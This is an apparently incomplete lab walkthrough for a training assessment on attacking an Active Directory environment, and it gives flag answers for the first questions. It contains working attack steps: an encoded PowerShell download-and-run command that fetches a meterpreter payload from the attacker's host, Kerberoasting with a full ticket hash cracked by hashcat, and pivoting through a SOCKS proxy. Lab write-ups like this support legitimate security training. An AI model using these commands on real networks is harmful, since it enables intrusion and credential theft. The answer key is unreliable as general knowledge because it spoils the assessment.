# AD Enumeration & Attacks - Skills Assessment Part I
## Scenario
A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin`:`My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

## Questions
1. Submit the contents of the flag.txt file on the administrator Desktop of the web server **Answer: JusT_g3tt1ng_st@rt3d!**
   - Visit the web at http://10.129.202.242/uploads/antak.aspx and enter the credentials `admin`:`My_W3bsH3ll_P@ssw0rd!` to access the shell
   - In the webshell, read the flag at `C:/Users/Administrator/Desktop/flag.txt`
        ```pwsh
        PS> more C:/Users/Administrator/Desktop/flag.txt
        JusT_g3tt1ng_st@rt3d!
        ```
2. Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer. **Answer: svc_sql**
   - Establish a meterpreter session using Metasploit:
        ```sh
        [msf](Jobs:0 Agents:0) >> use exploit/multi/script/web_delivery
        [msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set payload windows/x64/meterpreter/reverse_tcp
        payload => windows/x64/meterpreter/reverse_tcp
        [msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set SRVHOST 10.10.15.162  # attacker IP
        [msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set LHOST 10.10.15.162
        [msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> options

        Module options (exploit/multi/script/web_delivery):

        Name     Current Setting  Required  Description
        ----     ---------------  --------  -----------
        SRVHOST  10.10.15.162     yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
        SRVPORT  9999             yes       The local port to listen on.
        SSL      false            no        Negotiate SSL for incoming connections
        SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
        URIPATH                   no        The URI to use for this exploit (default is random)


        Payload options (windows/x64/meterpreter/reverse_tcp):

        Name      Current Setting  Required  Description
        ----      ---------------  --------  -----------
        EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
        LHOST     10.10.15.162     yes       The listen address (an interface may be specified)
        LPORT     4444             yes       The listen port


        Exploit target:

        Id  Name
        --  ----
        2   PSH



        View the full module info with the info, or info -d command.

        [msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set TARGET 2
        TARGET => 2
        [msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> exploit
        [*] Exploit running as background job 2.
        [*] Exploit completed, but no session was created.

        [*] Started reverse TCP handler on 10.10.15.162:4444 
        [*] Using URL: http://10.10.15.162:9999/qq2Hpi0Lz
        [msf](Jobs:1 Agents:0) exploit(multi/script/web_delivery) >> [*] Server started.
        [*] Run the following command on the target machine:
        powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAByAFQARAA1AE0APQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAcgBUAEQANQBNAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAcgBUAEQANQBNAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AMQA2ADIAOgA5ADkAOQA5AC8AcQBxADIASABwAGkAMABMAHoALwAyAHMAagBHAFAAOQBOAEkAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANQAuADEANgAyADoAOQA5ADkAOQAvAHEAcQAyAEgAcABpADAATAB6ACcAKQApADsA
        [*] 10.129.202.242   web_delivery - Delivering AMSI Bypass (1392 bytes)
        [*] 10.129.202.242   web_delivery - Delivering Payload (3719 bytes)
        [*] Sending stage (203846 bytes) to 10.129.202.242
        [*] Meterpreter session 1 opened (10.10.15.162:4444 -> 10.129.202.242:55132) at 2026-04-18 23:05:20 -0500
        ```
   - Migrate to a stable process:
        ```sh
        [msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) >> sessions

        Active sessions
        ===============

        Id  Name  Type                     Information                      Connection
        --  ----  ----                     -----------                      ----------
        1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WEB-WIN01  10.10.15.162:4444 -> 10.129.202.242:55132 (10.129.202.242)

        [msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) >> sessions -i 1
        [*] Starting interaction with 1...

        (Meterpreter 1)(C:\windows\system32\inetsrv) > ps

        Process List
        ============

        PID   PPID  Name               Arch  Session  User                          Path
        ---   ----  ----               ----  -------  ----                          ----
        0     0     [System Process]
        4     0     System             x64   0
        76    644   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
        84    644   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
        104   4     Registry           x64   0
        284   4     smss.exe           x64   0
        308   644   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
        360   644   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
        392   384   csrss.exe          x64   0
        496   644   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
        500   384   wininit.exe        x64   0
        508   492   csrss.exe          x64   1
        568   492   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
        588   1468  w3wp.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\inetsrv\w3wp.exe
        644   500   services.exe       x64   0
        664   500   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
        784   1540  vm3dservice.exe    x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\vm3dservice.exe
        796   644   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
        824   568   fontdrvhost.exe    x64   1        Font Driver Host\UMFD-1       C:\Windows\System32\fontdrvhost.exe
        832   500   fontdrvhost.exe    x64   0        Font Driver Host\UMFD-0       C:\Windows\System32\fontdrvhost.exe
        920   644   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
        1148  644   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
        1300  644   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
        1416  644   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
        1424  644   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
        1468  644   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
        1476  644   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
        1484  644   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
        1492  644   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
        1540  644   vm3dservice.exe    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vm3dservice.exe
        1584  644   vmtoolsd.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
        1640  644   VGAuthService.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
        1676  644   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
        1732  644   inetinfo.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\inetsrv\inetinfo.exe
        1872  1540  vm3dservice.exe    x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\vm3dservice.exe
        1992  588   powershell.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        2020  2896  conhost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
        2204  1992  conhost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
        2328  3032  conhost.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
        2444  644   dllhost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dllhost.exe
        2656  644   msdtc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
        2708  796   WmiPrvSE.exe       x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
        2880  1992  powershell.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        2896  588   powershell.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        3028  2896  powershell.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        3032  568   LogonUI.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe

        (Meterpreter 1)(C:\windows\system32\inetsrv) > migrate 568
        [*] Migrating from 2880 to 568...
        [*] Migration completed successfully.
        (Meterpreter 1)(C:\Windows\system32) > getuid
        Server username: NT AUTHORITY\SYSTEM
        ```
   - Upload PowerView module and enumerate SPN accounts, check the `serviceprincipalname` value for the requested SPN and read the `samaccountname`:
        ```pwsh
        (Meterpreter 1)(C:\Windows\system32) > upload /home/htb-ac-1863259/PowerView.ps1 C:\PowerView.ps1
        [*] Uploading  : /home/htb-ac-1863259/PowerView.ps1 -> C:PowerView.ps1
        [*] Uploaded 752.23 KiB of 752.23 KiB (100.0%): /home/htb-ac-1863259/PowerView.ps1 -> C:PowerView.ps1
        [*] Completed  : /home/htb-ac-1863259/PowerView.ps1 -> C:PowerView.ps1
        (Meterpreter 1)(C:\Windows\system32) > shell
        Process 1616 created.
        Channel 2 created.
        Microsoft Windows [Version 10.0.17763.107]
        (c) 2018 Microsoft Corporation. All rights reserved.
        C:\Windows\system32>cd C:
        C:\>powershell
        PS C:\> Import-Module ./powerview.ps1
        Import-Module ./powerview.ps1
        PS C:\> Get-DomainUser * -spn 
        <SNIP>
        logoncount            : 3
        badpasswordtime       : 12/31/1600 4:00:00 PM
        distinguishedname     : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        objectclass           : {top, person, organizationalPerson, user}
        lastlogontimestamp    : 4/11/2022 5:55:05 PM
        name                  : svc_sql
        objectsid             : S-1-5-21-2270287766-1317258649-2146029398-4608
        samaccountname        : svc_sql
        codepage              : 0
        samaccounttype        : USER_OBJECT
        accountexpires        : NEVER
        countrycode           : 0
        whenchanged           : 4/12/2022 12:55:05 AM
        instancetype          : 4
        objectguid            : 85756e4c-6d15-4ebf-ad90-8e877d55010d
        lastlogon             : 4/11/2022 7:51:02 PM
        lastlogoff            : 12/31/1600 4:00:00 PM
        objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
        dscorepropagationdata : 1/1/1601 12:00:00 AM
        serviceprincipalname  : MSSQLSvc/SQL01.inlanefreight.local:1433
        whencreated           : 3/30/2022 9:14:52 AM
        badpwdcount           : 0
        cn                    : svc_sql
        useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
        usncreated            : 35972
        primarygroupid        : 513
        pwdlastset            : 3/30/2022 2:14:52 AM
        usnchanged            : 41044
        <SNIP>
        ```
3. Crack the account's password. Submit the cleartext value. **Answer: lucky7**
   - Target the `svc_sql` account to retrieve the SPN ticket for offline cracking:
        ```pwsh
        PS C:\> Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat                    
        Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat


        SamAccountName       : svc_sql
        DistinguishedName    : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        ServicePrincipalName : MSSQLSvc/SQL01.inlanefreight.local:1433
        TicketByteHexStream  : 
        Hash                 : $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$A27150B2BA8F4B
                            689A336BBE289A2772$DD0897938BC17E32CA27E75C7B6A1116666B65E80DC95E29351BE04DC7E05F16E5AB7317941DC
                            596578E4DD3382608E85AC3FEC2427722B73B179C61BC583CF4590596F75950C612972579599346CED71D9CEA6EC169D
                            71E79F0BCEC0DD3413971A98AF03858105F67AEE08827557A46AE13F901047889386B830B96B5A8E0F2703F15D82F588
                            89360A057686506D16E0200C8C8BE155885C20BB211A513771E054F20DB5563A7E9F8F6CC119C8A7B80A26D23358EF3C
                            8E9DC961CFB5D909BE62CC6797CB2C80FF0F7AE3B65F083E29E31CF036D78A3D52E9DC48C0306198CDF1A8F9998CFBE9
                            3C19D9284130CC229301CFE76966B6FFEEAF9CABBD021439EDDA21DB4AFC6394610E9A3C3064D0E9577F9632F75B2C74
                            0954D85896464AABDF052F80C07EB1B148AD2B7750F2D25DB5B1599FCBBE8B55021E5C72BD1CEC244C76B3D2E62C45A2
                            AEB8C238920ED68E8D6DE92419279EB4F26210C5FBE7FB0960EA366C1DF6DA1FBF4371A6645E372CB8FA3176CF06A490
                            1DEB88BD2E8BADCA14A7746A7E5D648E4AEAE434B3FE8EE18146E82450EC0D21F43A7EE8DDE3486C72DAAEC7CE7EDAAC
                            6F60ECB9EFB6908B9D1603E2955D6528B286EAA64873B153671222E8AF281F77CBA8793E7E6290E3AA670515EF70862A
                            EB79726A339BB2CF9EF4DA59B2DADFCB5944F89E5E4529F9145AB7F1E80F9EFC9CE8908C415AE1F7951991F999A1853E
                            43F17F76A7A5522475939B8F76C073D4EA65DE8B9434AA209C7656591C4F944DF899218FB528C7F3284141E40B8D44B6
                            D4CEA8E9DBFB9ECE43FD28182CB7F7EA4511FC4D0EBEE50E3D7001DE9CBBBC8FEE17C1434FB6B4C2008D71B49D1FEFBB
                            9A2698FFACF43886A764EE614B2BD27456EF856004DA3996CF0E2309C63FE8AC465DEA3AC6F75B979A897EAF5CEEB867
                            D7912B65AB8E2787A2AAA09D0C62D9CD17ADAA7953EF4DCD40E55693D1A0FAE6491B0C80202772F1637CB7485C97D6E1
                            A8374691EA9A31DC7C336780FDD2F01BC6A976CA6945B49EBF1213BBE4ABB1CF26A165E88528913DE5AAEE055C67952E
                            70A5E651EAAC77ADF25D2CDA7FE19852B3C38F9CEC20C3A0C9CAE67DBE13917E10F3E7F70A99957E3F2FF3D1F75DA305
                            1FBF8E1902DBBAA9A7CDB34E4E78CBDFF3B03A75C67E11BF8360C1A22EFC58527879B3ABE9852427A75FF876DB75A4D5
                            44E77954FD6524F5183BD4E87186BA61B90D32D847A57290A6B878A78D3DE2D28DC41A6301038FACEE476E38F4BA8141
                            B3B79CB1C22FF82C2258D1EB6F870D455163C6F38A24DED49C4857950F2E21290B19ECD7EA8A2B689A5B038CA5D21DC0
                            DE71E9B50B40B24E014DE7E4E56C3CC6F067744A8AB0793DE96C7818AC086352AB8D2D0A508067172A291FDEEFC5BC61
                            C3D9D4ED48B9C59102D8670314997D52F5062581117789D6289D7FEB3FAC19613000BD52F280AE217D8864692AFC7A68
                            2423FA7AC0D59993537AAAFF60F0EA405A5FF305F2CB177AF4557BAB15F11845066
        ```
   - Crack the hash with hashcat:
        ```sh
        $ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt 
        <SNIP>

        $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$a27150b2ba8f4b689a336bbe289a2772$dd0897938bc17e32ca27e75c7b6a1116666b65e80dc95e29351be04dc7e05f16e5ab7317941dc596578e4dd3382608e85ac3fec2427722b73b179c61bc583cf4590596f75950c612972579599346ced71d9cea6ec169d71e79f0bcec0dd3413971a98af03858105f67aee08827557a46ae13f901047889386b830b96b5a8e0f2703f15d82f58889360a057686506d16e0200c8c8be155885c20bb211a513771e054f20db5563a7e9f8f6cc119c8a7b80a26d23358ef3c8e9dc961cfb5d909be62cc6797cb2c80ff0f7ae3b65f083e29e31cf036d78a3d52e9dc48c0306198cdf1a8f9998cfbe93c19d9284130cc229301cfe76966b6ffeeaf9cabbd021439edda21db4afc6394610e9a3c3064d0e9577f9632f75b2c740954d85896464aabdf052f80c07eb1b148ad2b7750f2d25db5b1599fcbbe8b55021e5c72bd1cec244c76b3d2e62c45a2aeb8c238920ed68e8d6de92419279eb4f26210c5fbe7fb0960ea366c1df6da1fbf4371a6645e372cb8fa3176cf06a4901deb88bd2e8badca14a7746a7e5d648e4aeae434b3fe8ee18146e82450ec0d21f43a7ee8dde3486c72daaec7ce7edaac6f60ecb9efb6908b9d1603e2955d6528b286eaa64873b153671222e8af281f77cba8793e7e6290e3aa670515ef70862aeb79726a339bb2cf9ef4da59b2dadfcb5944f89e5e4529f9145ab7f1e80f9efc9ce8908c415ae1f7951991f999a1853e43f17f76a7a5522475939b8f76c073d4ea65de8b9434aa209c7656591c4f944df899218fb528c7f3284141e40b8d44b6d4cea8e9dbfb9ece43fd28182cb7f7ea4511fc4d0ebee50e3d7001de9cbbbc8fee17c1434fb6b4c2008d71b49d1fefbb9a2698ffacf43886a764ee614b2bd27456ef856004da3996cf0e2309c63fe8ac465dea3ac6f75b979a897eaf5ceeb867d7912b65ab8e2787a2aaa09d0c62d9cd17adaa7953ef4dcd40e55693d1a0fae6491b0c80202772f1637cb7485c97d6e1a8374691ea9a31dc7c336780fdd2f01bc6a976ca6945b49ebf1213bbe4abb1cf26a165e88528913de5aaee055c67952e70a5e651eaac77adf25d2cda7fe19852b3c38f9cec20c3a0c9cae67dbe13917e10f3e7f70a99957e3f2ff3d1f75da3051fbf8e1902dbbaa9a7cdb34e4e78cbdff3b03a75c67e11bf8360c1a22efc58527879b3abe9852427a75ff876db75a4d544e77954fd6524f5183bd4e87186ba61b90d32d847a57290a6b878a78d3de2d28dc41a6301038facee476e38f4ba8141b3b79cb1c22ff82c2258d1eb6f870d455163c6f38a24ded49c4857950f2e21290b19ecd7ea8a2b689a5b038ca5d21dc0de71e9b50b40b24e014de7e4e56c3cc6f067744a8ab0793de96c7818ac086352ab8d2d0a508067172a291fdeefc5bc61c3d9d4ed48b9c59102d8670314997d52f5062581117789d6289d7feb3fac19613000bd52f280ae217d8864692afc7a682423fa7ac0d59993537aaaff60f0ea405a5ff305f2cb177af4557bab15f11845066:lucky7

        <SNIP>
        ```
4. Submit the contents of the flag.txt file on the Administrator desktop on MS01. **Answer:**
   - Identify other reachable host in the internal network:
          ```
          PS C:\> ipconfig
          ipconfig

          Windows IP Configuration


          Ethernet adapter Ethernet1:

          Connection-specific DNS Suffix  . : 
          Link-local IPv6 Address . . . . . : fe80::190a:a2fa:db2d:adf8%7
          IPv4 Address. . . . . . . . . . . : 172.16.6.100
          Subnet Mask . . . . . . . . . . . : 255.255.0.0
          Default Gateway . . . . . . . . . : 172.16.6.1

          Ethernet adapter Ethernet0:

          Connection-specific DNS Suffix  . : .htb
          IPv6 Address. . . . . . . . . . . : dead:beef::1549:d44:aeaa:3c55
          Link-local IPv6 Address . . . . . : fe80::1549:d44:aeaa:3c55%3
          IPv4 Address. . . . . . . . . . . : 10.129.202.242
          Subnet Mask . . . . . . . . . . . : 255.255.0.0
          Default Gateway . . . . . . . . . : fe80::250:56ff:feb0:777b%3
                                             10.129.0.1
          PS C:\> exit
          exit

          C:\>exit
          exit
          (Meterpreter 1)(C:\) > run post/multi/gather/ping_sweep RHOSTS=172.16.6.0/24
          [*] Performing ping sweep for IP range 172.16.6.0/24
          [+] 	172.16.6.3 host found
          [+] 	172.16.6.50 host found
          [+] 	172.16.6.100 host found
          ```
   - Identify the hostname of the machine at a specific IP to identify MS01:
          ```pwsh
          C:\>ping -a 172.16.6.50
          ping -a 172.16.6.50

          Pinging MS01 [172.16.6.50] with 32 bytes of data:
          Reply from 172.16.6.50: bytes=32 time<1ms TTL=128
          Reply from 172.16.6.50: bytes=32 time<1ms TTL=128
          Reply from 172.16.6.50: bytes=32 time=5ms TTL=128
          Reply from 172.16.6.50: bytes=32 time=1ms TTL=128

          Ping statistics for 172.16.6.50:
          Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
          Approximate round trip times in milli-seconds:
          Minimum = 0ms, Maximum = 5ms, Average = 1ms

          ```
   - Set up a meterpreter tunneling to tunnel traffic from attack host through this vulnerable web host to the target MS01:
          ```sh
          (Meterpreter 1)(C:\) > run autoroute -s 172.16.6.0/24
          [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
          [!] Example: run post/multi/manage/autoroute OPTION=value [...]
          [*] Adding a route to 172.16.6.0/255.255.255.0...
          [+] Added route to 172.16.6.0/255.255.255.0 via 10.129.202.242
          [*] Use the -p option to list all active routes
          (Meterpreter 1)(C:\) > run autoroute -p
          [!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
          [!] Example: run post/multi/manage/autoroute OPTION=value [...]

          Active Routing Table
          ====================

          Subnet             Netmask            Gateway
          ------             -------            -------
          172.16.6.0         255.255.255.0      Session 1

          (Meterpreter 1)(C:\) > background
          [*] Backgrounding session 1...
          [msf](Jobs:1 Agents:2) exploit(multi/script/web_delivery) >> use auxiliary/server/socks_proxy
          [msf](Jobs:1 Agents:2) auxiliary(server/socks_proxy) >> set SRVPORT 9050
          SRVPORT => 9050
          [msf](Jobs:1 Agents:2) auxiliary(server/socks_proxy) >> set SRVHOST 0.0.0.0
          SRVHOST => 0.0.0.0
          [msf](Jobs:1 Agents:2) auxiliary(server/socks_proxy) >> set version 4a
          version => 4a
          [msf](Jobs:1 Agents:2) auxiliary(server/socks_proxy) >> run
          [*] Auxiliary module running as background job 1.

          [msf](Jobs:2 Agents:2) auxiliary(server/socks_proxy) >> [*] Starting the SOCKS proxy server

          ```
   - 
5. Find cleartext credentials for another domain user. Submit the username as your answer. **Answer:**
6. Submit this user's cleartext password. **Answer:**
7. What attack can this user perform? **Answer:**
8. Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01. **Answer:**



